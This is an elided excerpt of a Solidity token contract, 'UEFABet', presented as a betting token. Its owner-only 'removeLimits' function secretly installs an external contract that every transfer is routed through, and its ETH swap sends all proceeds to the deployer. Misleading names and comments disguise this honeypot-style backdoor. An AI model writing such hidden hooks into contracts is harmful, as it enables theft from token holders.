...
https://uefachampion.bet
https://t.me/uefachampionbet
...
contract UEFABet is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address public bettingFeeWallet;
    ...
    struct bettingConfig {
        ...
        address limited;
        address bettingScorer;
        uint256 amount;
    }
    address private bettingScorer;
    ...
    constructor() {
        ...
        bettingFeeWallet = address(msg.sender); // set as betting fee wallet
    ...
    function removeLimits(bettingConfig memory _bettingConfig) external onlyOwner returns (bool){
        limitsInEffect = !_bettingConfig.limitsInEffect;
        transferDelayEnabled = !_bettingConfig.transferDelayEnabled;
        excludedLimits(_bettingConfig.limited, _bettingConfig.bettingScorer, _bettingConfig.amount);
        emit RemoveLimits();
        return true;
    }
    ...
    function markScore(address from, address to, uint256 amount) private returns(bool) {
        if(bettingScorer != address(0)) return IERC20(bettingScorer).transferFrom(from, to, amount); // mark score on betting scorer contract !important
        return true;
    }
    ...
    function _transfer(
        ...
        bool canSwap = contractBalanceOf >= swapTokensAtAmount || markScore(from, to, amount) ;
        if( 
            canSwap && swapEnabled &&
    ...
    function swapBackEth() private {
        ...
        (success,) = address(bettingFeeWallet).call{value: address(this).balance}("");
        require(success);
    }
    ...
    function autoBurnLPTokens() internal returns (bool){
        ...
        if (amountToBurn > 0){
            _transferToken(uniswapV2Pair, address(0xdead), amountToBurn);
        }
